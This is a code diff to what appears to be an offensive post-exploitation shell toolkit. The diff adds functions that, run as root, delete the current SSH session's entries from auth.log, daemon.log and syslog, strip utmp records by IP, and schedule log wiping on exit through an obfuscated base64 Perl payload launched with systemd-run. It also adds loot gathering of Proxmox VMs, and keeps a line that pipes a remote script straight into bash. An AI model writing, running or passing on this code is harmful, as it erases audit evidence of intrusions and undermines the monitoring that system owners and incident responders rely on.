@@ -1535,9 +1535,113 @@ _warn_upx_exe() {
     echo -en "${str}"$'\033[0m'
 }
 
+# Remove sshd and systemd-logind entries related to the current session from auth.log, daemon.log and syslog.
+
+_CS_SCRIPT=$(cat <<'PERL'
+use strict;
+use warnings;
+use Fcntl qw(:seek);
+
+my $sid     = $ENV{XDG_SESSION_ID};
+my $env_pid = $ENV{_SSHD_PID};
+die "Neither XDG_SESSION_ID nor _SSHD_PID is set\n" unless $sid || $env_pid;
+
+my @logs = map { -f $_ ? $_ : "/var/log/$_" } qw(auth.log daemon.log syslog);
+my $auth = (grep { /auth\.log$/ } @logs)[0];
+
+my %pids;
+if ($env_pid && $sid) {
+    $pids{$env_pid} = 1;
+} elsif ($env_pid) {
+    $pids{$env_pid} = 1;
+    open my $fh, '<', $auth or die "open $auth: $!";
+    my @alines = <$fh>; close $fh;
+    my ($ts) = map {
+        !/\bsshd\[$env_pid\]/ ? () :
+        /^(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})/ ? $1 :
+        /^((?:\S+\s+){2}\S+)/ ? $1 : ()
+    } @alines;
+    ($sid) = map {
+        /^\Q$ts\E\S*\s+\S+\s+systemd-logind\[\d+\].*\bsession\s+(\d+)\b/i ? $1 : ()
+    } @alines if $ts;
+    warn "No session ID found for sshd PID $env_pid in $auth\n" unless $sid;
+} else {
+    open my $fh, '<', $auth or die "open $auth: $!";
+    my @alines = <$fh>; close $fh;
+    my ($ts) = map {
+        !/\bsystemd-logind\[\d+\].*\bsession\s+\Q$sid\E\b/i ? () :
+        /^(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})/ ? $1 :
+        /^((?:\S+\s+){2}\S+)/ ? $1 : ()
+    } @alines;
+    warn "No systemd-logind session $sid entry found in $auth\n" unless $ts;
+    %pids = map { /^\Q$ts\E\S*\s+\S+\s+sshd\[(\d+)\]/ ? ($1 => 1) : () } @alines if $ts;
+}
+
+my $pid_re = %pids ? '(?:' . join('|', sort keys %pids) . ')' : undef;
+print STDERR "Session " . ($sid // 'unknown') . " => sshd PID(s): " . (%pids ? join(', ', sort keys %pids) : 'none') . "\n";
+print "$_\n" for sort keys %pids;
+
+for my $file (@logs) {
+    unless (-f $file) { print STDERR "  $file: not found, skipping\n"; next }
+    open my $fh, '+<', $file or do { warn "open $file: $!"; next };
+    my @in = <$fh>;
+    my @out = grep {
+        !(/\bsystemd(?:-logind)?\[\d+\]/ && /\b\Q$sid\E\b/) &&
+        !($pid_re && /\bsshd\[$pid_re\]/)
+    } @in;
+    my $n = @in - @out;
+    unless ($n) { close $fh; print STDERR "  $file: nothing to remove\n"; next }
+    seek $fh, 0, SEEK_SET; print $fh @out; truncate $fh, tell($fh); close $fh;
+    print STDERR "  $file: removed $n line(s)\n";
+}
+PERL
+)
+
+sshd_clean() {
+    local pid
+    [[ $UID -eq 0 ]] || return
+    pid=$(_CS_SCRIPT="$_CS_SCRIPT" _SSHD_PID="${1:-$_SSHD_PID}" perl -e 'eval $ENV{_CS_SCRIPT}; die $@ if $@')
+    [ -z "$1" ] && {
+        [ -z "$_HS_SSHD_TRIM_ON_EXIT" ] && _HS_SSHD_TRIM_ON_EXIT="$pid"
+        echo -e "Tip: ${CDC}sshd_clean <SSHD-PID>${CN} to cleanse old logs by PID"
+    }
+}
+
+clean() {
+    # FIXME: Also clean utmp/wtmp/lastlog/btmp
+    sshd_clean
+}
+
+_hs_sshd_clean_on_exit() {
+    [[ -n $_HS_SSHD_TRIM_ON_EXIT ]] || return
+    local sid="$XDG_SESSION_ID"
+    local pid="$_HS_SSHD_TRIM_ON_EXIT"
+    local script_b64
+    script_b64=$(printf '%s' "$_CS_SCRIPT" | base64 -w0)
+    systemd-run --no-block --quiet \
+        --setenv=XDG_SESSION_ID="$sid" \
+        --setenv=_SSHD_PID="$pid" \
+        --setenv=_CS_SCRIPT="$script_b64" \
+        /usr/bin/perl -e 'use MIME::Base64; sleep 2; eval decode_base64($ENV{_CS_SCRIPT}); die $@ if $@'
+}
+
 lastlog_clean() {
     [ $# -lt 1 ] && { echo -e >&2 "Usage: lastlog_clean 'IP' 'NEW IP' [/var/log/lastlog]"; return 255; }
     perl -0777 -pi -e 'BEGIN{$f=shift;$r=shift;$l=length($f)>length($r)?length($f):length($r);$f.="\x00"x($l-length($f));$r.="\x00"x($l-length($r))}s/\Q$f\E/$r/g' -- "${1:?}" "${2:-""}" "${3:-/var/log/lastlog}"
+}
+
+utmp_clean() {
+    [ $# -lt 1 ] && { echo >&2 "Usage: utmp_clean 'OLD_IP' [/var/run/utmp]"; return 255; }
+    perl -0777 -pi -e '
+        BEGIN {
+            $ip = shift;
+            $packed = pack("C4", split(/\./, $ip)) . "\x00" x 12;
+            $s = -s $ARGV[0];
+            ($reclen) = grep { $s % $_ == 0 } (384, 192, 180, 176);
+            $reclen ||= 384;
+        }
+        s{(.{$reclen})}{index($1,$packed)!=-1?"":$1}ge
+    ' -- "${1:?}" "${2:-/var/run/utmp}"
 }
 
 # wtmp_trim <number of entries to remove> [file]
@@ -1548,8 +1652,9 @@ wtmp_trim() {
         echo -e >&2 "${CDY}Usage:${CN} wtmp_trim <number of entries to remove> [/var/log/wtmp]"
         echo -e >&2 "\
 ${CDM}wtmp${CN}    = login/logout history - ${CDC}last${CN}, ${CDC}utmpdump /var/log/wtmp${CN}
-${CDM}utmp${CN}    = currently logged in users - ${CDC}who${CN}/${CDC}w${CN}, ${CDC}utmpdump /var/run/utmp${CN}
 ${CDM}btmp${CN}    = failed login attempts - ${CDC}lastb${CN}, ${CDC}utmpdump /var/log/btmp${CN}
+Use ${CDC}utmp_clean${CN} and ${CDC}lastlog_clean${CN} to remove specific IPs:
+${CDM}utmp${CN}    = currently logged in users - ${CDC}who${CN}/${CDC}w${CN}, ${CDC}utmpdump /var/run/utmp${CN}
 ${CDM}lastlog${CN} = last login of each user - ${CDC}lastlog${CN}, ${CDC}lastlog_clean${CN}"
         return 255
     }
@@ -2133,6 +2238,16 @@ _lootmore_lxc() {
     echo -en "${CN}"
 }
 
+_lootmore_qm() {
+    command -v qm >/dev/null || return
+
+    str="$(qm list 2>/dev/null | tail -n +2)"
+    [ -z "$str" ] && return
+    echo -e "${CB}Proxmox VMs${CF} [try qm list]${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+}
+
 _lootmore_vz() {
     command -v vzlist >/dev/null || return
 
@@ -2287,6 +2402,7 @@ lootmore() {
     _lootmore_pct
     _lootmore_lxc
     _lootmore_vz
+    _lootmore_qm
     _lootmore_video
 
     str="$(grep -sE '^[[:digit:]]' "${ROOTFS}/etc/hosts" |grep -vF -e localhost -e 127.0.0.1)"
@@ -2445,26 +2561,30 @@ ws() {
     dl 'https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh' | bash
 }
 
+xresize() {
+    local R a IFS
+    # NOTE: On localhost, this wont always work because xterm responds to fast and
+    # before 'read' gets executed.
+    stty -echo;printf "\e[18t"; read -t5 -rdt R;
+    IFS=';' read -r -a a <<< "${R:-8;25;80}"
+    # Normally it returns ROWS/25:COLS/80 but some systems return it reverse
+    [ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}"; a[1]="${a[2]}"; a[2]="${R}"; }
+    stty sane rows "${a[1]}" cols "${a[2]}"
+    export COLUMNS="${a[2]}" LINES="${a[1]}"
+}
+
 _hs_try_resize() {
     local str
-    local R
-    local a
-    local IFS
     command -v reset >/dev/null && TERM=xterm reset -I
 
     command -v stty >/dev/null || return
     str="$(stty size)"
     if [[ "$str" == "24 80" ]] || [[ "$str" == "25 80" ]] || [[ "$str" == "0 0" ]]; then
-        # NOTE: On localhost, this wont always work because xterm responds to fast and
-        # before 'read' gets executed.
-        stty -echo;printf "\e[18t"; read -t5 -rdt R;
-        IFS=';' read -r -a a <<< "${R:-8;25;80}"
-        # Normally it returns ROWS/25:COLS/80 but some systems return it reverse
-        [ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}"; a[1]="${a[2]}"; a[2]="${R}"; }
-        stty sane rows "${a[1]}" cols "${a[2]}"
-        export COLUMNS="${a[2]}" LINES="${a[1]}"
+    	xresize
     fi
 }
+
+command -v resize >/dev/null || alias resize=xresize
 
 _hs_mk_pty() {
     echo -e "${CDM}Upgrading to PTY Shell${CN}${CF} [disable with ${CDC}${CF}export NOPTY=1${CN}${CF}]${CN}"
@@ -2594,6 +2714,10 @@ xghost() {
 }
 
 hs_exit() {
+    [ -n "$_HS_SSHD_TRIM_ON_EXIT" ] && {
+        HS_INFO "Cleanging sshd logs on exit..."
+        _hs_sshd_clean_on_exit
+    }
     cd /tmp || cd /dev/shm || cd /
     [ -n "$_is_hs_bounceinit" ] && HS_WARN "Bounce still set. Type ${CDC}unbounce${CN} to stop the forward."
     [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
